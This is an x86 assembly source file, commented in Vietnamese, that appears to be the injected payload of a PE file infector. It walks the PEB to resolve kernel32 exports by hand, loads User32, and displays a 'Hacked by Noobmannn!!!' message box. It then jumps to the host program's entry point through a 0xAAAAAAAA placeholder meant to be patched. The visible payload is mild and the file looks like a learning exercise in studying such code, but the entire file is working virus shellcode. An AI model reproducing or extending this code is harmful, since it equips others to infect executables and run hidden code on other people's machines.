.386 
.model flat, stdcall 
.stack 4096
assume fs:nothing

.data

.code
_start:
    push ebp
    mov ebp, esp
    sub esp, 28h
    call sub_A0
    db 'LoadLibraryA', 0

sub_A0:
    call peb_getFunc
    mov [ebp - 04h], eax            ; Address of LoadLibraryA
    call sub_A1
    db 'GetProcAddress', 0

sub_A1:
    call peb_getFunc
    mov [ebp - 08h], eax            ; Address of GetProcAddress
    xor eax, eax
    call sub_A2
    db 'User32.dll', 0

sub_A2:
    mov eax, [ebp - 04h]
    call eax
    mov [ebp - 0ch], eax            ; hDll of User32.dll    
    xor eax, eax
    xor ebx, ebx
    call sub_A3  
    db 'MessageBoxA', 0

sub_A3:
    mov eax, [ebp - 08h]
    mov ebx, [ebp - 0ch]
    push ebx
    call eax
    mov [ebp - 10h], eax            ; Address of MessageBoxA
    xor eax, eax
    xor ebx, ebx
	call sub_A4
	db 'Kernel32.dll', 0

sub_A4:
	mov eax, [ebp - 04h]
    call eax
	mov [ebp - 14h], eax			; hDll of Kernel32.dll
	xor eax, eax
    xor ebx, ebx
	call sub_A5
	db 'GetModuleHandleW', 0

sub_A5:
	mov eax, [ebp - 08h]
	mov ebx, [ebp - 14h]
	push ebx
	call eax
	mov [ebp - 18h], eax			; GetModuleHandleW
	xor eax, eax
    xor ebx, ebx
	call sub_A6
	db 'GetCurrentProcess', 0

sub_A6:
	mov eax, [ebp - 08h]
	mov ebx, [ebp - 14h]
	push ebx
	call eax
	mov [ebp - 1ch], eax			; GetCurrentProcess
	xor eax, eax
    xor ebx, ebx
	call sub_A7
	db 'K32GetModuleInformation', 0

sub_A7:
	mov eax, [ebp - 08h]
	mov ebx, [ebp - 14h]
	push ebx
	call eax
	mov [ebp - 20h], eax			; K32GetModuleInformation
	xor eax, eax
    xor ebx, ebx
    call sub_A8
    db 'WARNING!!!', 0

sub_A8:
	pop esi
    call sub_A9
    db 'Hacked by Noobmannn!!!', 0

sub_A9:
    pop edi
    xor eax, eax
    mov eax, [ebp - 10h]
    xor ebx, ebx
    push ebx
    push esi
    push edi
    push ebx
    call eax
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi
	mov eax, [ebp - 18h]			
	push 0
	call eax						; GetModuleHandleW
	mov [ebp - 24h], eax
	xor eax, eax
	mov eax, [ebp - 1ch]
	call eax						; GetCurrentProcess
	mov esi, eax
	mov edi, [ebp - 24h]
	xor eax, eax
	xor ecx, ecx
	mov [ebp - 28h], ecx
	lea ecx, [ebp - 28h]
	mov eax, [ebp - 20h]
	push 0Ch
	push ecx
	push edi
	push esi
	call eax						; K32GetModuleInformation
	xor eax, eax
	mov eax, dword ptr [ebp - 28h]
	add eax, 0AAAAAAAAh	
    add esp, 28h      
    mov esp, ebp
    pop ebp
	push eax
    ret

peb_getFunc:
	push ebp
	mov ebp, esp
    sub esp, 14h
	xor eax, eax
	mov [ebp - 04h], eax			; lưu số lượng hàm trong kernel32.dll
	mov [ebp - 08h], eax			; lưu địa chỉ của EXPORT Address Table
	mov [ebp - 0ch], eax			; lưu địa chỉ của EXPORT Name Pointer Table
	mov [ebp - 10h], eax			; lưu địa chỉ của EXPORT Ordinal Table
	mov [ebp - 14h], eax			
	; lấy địa chỉ kernel32.dll
	; TEB->PEB->Ldr->InMemoryOrderLoadList->currentProgram->ntdll->kernel32.BaseDll
	mov eax, [fs:30h]		    	; Trỏ đến PEB (https://en.wikipedia.org/wiki/Win32_Thread_Information_Block)
	mov eax, [eax + 0ch]			; Trỏ đến Ldr
	mov eax, [eax + 14h]			; Trỏ đến InMemoryOrderModuleList
	mov eax, [eax]				  	; Trỏ đến currentProgram module
	mov eax, [eax]  				; Trỏ đến ntdll module
	mov eax, [eax -8h + 18h]		; eax = kernel32.dll base
	mov ebx, eax					; lưu địa chỉ của kernel32.dll vào ebx
	; lấy địa chỉ của PE signature
	mov eax, [ebx + 3ch]			; offset 0x30 sau kernel32.dll - data là RVA của PE signature (0xf8)
	add eax, ebx				    ; địa chỉ của PE signature: eax = 0xf8 + kernel32 base
	; lấy địa chỉ của Export Table
	mov eax, [eax + 78h]			; offset 0x78 sau PE signature là RVA của Export Table - data là RVA của IMAGE_EXPORT_DIRECTORY (0x93e40)
	add eax, ebx					; địa chỉ của  IMAGE_EXPORT_DIRECTORY = 0x93e40 + kernel32 base

	; lấy số lượng các hàm trong kernel32.dll
	mov ecx, [eax + 14h]			; 0x93e40 + 0x14 = 0x93e54 - data là số hàm có trong kernel32.dll (0x66b)
	mov [ebp - 4h], ecx				; [ebp - 4h] = 0x66b
	; lấy địa chỉ của EXPORT Address Table (nơi chứa địa chỉ các hàm của kernel32.dll)
	mov ecx, [eax + 1ch]			; 0x93e40 + 0x1c = 0x93e5c - data là địa chỉ của EXPORT Address Table (0x93e68)
	add ecx, ebx				   	; cộng thêm địa chỉ kernel32.dll
	mov [ebp - 8h], ecx				; [ebp - 8h] = 0x93e68 + kernel32 base
	; lấy địa chỉ của EXPORT Name Pointer Table (so sánh tên hàm với giá trị của cái này)
	mov ecx, [eax + 20h]			; 0x93e40 + 0x20 = 0x93e60 - data là địa chỉ của EXPORT Name Pointer Table (0x95814)
	add ecx, ebx					; cộng thêm địa chỉ kernel32.dll
	mov [ebp - 0ch], ecx			; [ebp - 0ch] = 0x95814 + kernel32 base
	; lấy địa chỉ của EXPORT Ordinal Table
	mov ecx, [eax + 24h]			; 0x93e40 + 0x24 = 0x93e64 - data là địa chỉ của EXPORT Name Pointer Table (0x971c0)
	add ecx, ebx					; cộng thêm địa chỉ kernel32.dll
	mov [ebp - 10h], ecx			; [ebp - 10h] = 0x971c0 + kernel32 base

	; vòng lặp tìm địa chỉ của hàm cần gọi trong kernel32.dll
	xor eax, eax
	xor ecx, ecx
		
	findYourFunctionPosition:
		mov esi, [ebp + 08h]		; esi = địa chỉ của chuỗi tên hàm cần tìm
		mov edi, [ebp - 0ch]		; edi = địa chỉ của EXPORT Name Pointer Table
		cld							; set cho Direction Flag bằng 0 (https://en.wikipedia.org/wiki/Direction_flag)
		mov edi, [edi + eax*4]		; edi + eax*4 để tính RVA của hàm tiếp theo => data của nó là địa chỉ hàm tiếp theo
		add edi, ebx				; cộng thêm với địa chỉ kernel32.dll
		mov cx, 8					; so sánh 8 byte đầu
		repe cmpsb					; so sánh [esi] và [edi]
			
		jz GetYourFunctionFound
		inc eax						; i++
		cmp eax, [ebp - 4h]			; kiểm tra xem check hết các hàm chưa
		jne findYourFunctionPosition	
			
	GetYourFunctionFound:		
		mov ecx, [ebp - 10h]		; ecx = ordinal table
		mov edx, [ebp - 8h]			; edx = export address table
		; tính địa chỉ hàm
		mov ax, [ecx + eax * 2]		; tính ordinal của hàm
		mov eax, [edx + eax * 4]	; lấy RVA của function
		add eax, ebx               	; cộng thêm địa chỉ kernel32.dll để lấy chính xác địa chỉ của hàm 
    add esp, 14h      
    mov esp, ebp
    pop ebp
    ret
END _start
